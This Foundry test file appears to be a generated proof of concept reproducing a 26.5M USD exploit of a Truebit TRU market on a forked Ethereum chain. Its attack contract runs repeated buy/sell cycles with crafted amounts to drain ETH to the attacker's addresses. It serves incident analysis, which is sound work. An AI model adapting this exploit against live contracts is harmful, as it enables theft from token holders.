// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : 26.51M USD
// Attacker : 0x6c8ec8f14be7c01672d31cfa5f2cefeab2562b50
// Attack Contract : 0x1de399967b206e446b4e9aeeb3cb0a0991bf11b8
// Vulnerable Contract : 0x1de399967b206e446b4e9aeeb3cb0a0991bf11b8
// Attack Tx : 0xcd4755645595094a8ab984d0db7e3b4aabde72a5c87c4f176a030629c47fb014
// Block : 24191019
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 26.5M USD
//
// @POC Author
// Generated PoC

interface ITruebitMarket {
    function buyTRU(uint256 amount) external payable returns (uint256);
    function getPurchasePrice(uint256 amount) external returns (uint256);
    function sellTRU(uint256 amount) external returns (uint256);
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant ATTACK_CONTRACT = 0x1De399967B206e446B4E9AeEb3Cb0A0991bF11b8;
    address internal constant ATTACKER_EOA = 0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50;
    address internal constant PROFIT_RECIPIENT = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
    address internal constant TRUEBIT_MARKET = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
    address internal constant TRU_TOKEN = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;
}

contract AttackTest is Base {
    uint256 internal constant TX_TIMESTAMP = 1767888155;
    uint256 internal constant TX_BLOCK_NUMBER = 24191019;
    uint256 internal constant TX_VALUE = 10000000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        vm.warp(TX_TIMESTAMP);
        vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        OurAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        executeAttack(attack);
        _logBalances("After exploit");
        _assertProfit();
    }

    function executeAttack(OurAttack attack) internal {
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x64dd891a), 100000000000000000);
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _etchRuntime();
        attack = OurAttack(payable(Addresses.ATTACK_CONTRACT));
    }

    function _etchRuntime() internal {
        vm.etch(Addresses.ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.PROFIT_RECIPIENT, address(0), Addresses.ZERO, "ETH", 100000000000000000);
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.ZERO, "ETH", 8535348497836391626573);
    }
}

contract OurAttack {
    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x64dd891a) {
            attack();
            return;
        }
    }

    function attack() public payable {
        _tradeCycles();
        _settleProfit();
    }

    function _tradeCycles() internal {
        _tradeTRU(240442509453545333947284131, 0);
        _tradeTRU(441010174513890026925958238, 6);
        _tradeTRU(970752178501023300932298000, 319134474904345);
        _tradeTRU(2808567055501947160504720479, 15168571520541215);
        _tradeTRU(12548923878784675664886517494, 5114995545275641043);
    }

    function _tradeTRU(uint256 quotedAmount, uint256 ethValue) internal {
        ITruebitMarket market = ITruebitMarket(Addresses.TRUEBIT_MARKET);
        IERC20Like tru = IERC20Like(Addresses.TRU_TOKEN);

        market.getPurchasePrice(quotedAmount);
        market.buyTRU{value: ethValue}(quotedAmount);

        uint256 truBalance = tru.balanceOf(address(this));
        tru.approve(Addresses.TRUEBIT_MARKET, truBalance);
        market.sellTRU(truBalance);
    }

    function _settleProfit() internal {
        _sendETH(Addresses.PROFIT_RECIPIENT, 100000000000000000);
        _sendETH(Addresses.ATTACKER_EOA, 8535363576519732789359);
    }

    function _sendETH(address recipient, uint256 amount) internal {
        (bool ok,) = payable(recipient).call{value: amount}("");
        require(ok, "native payout failed");
    }
}
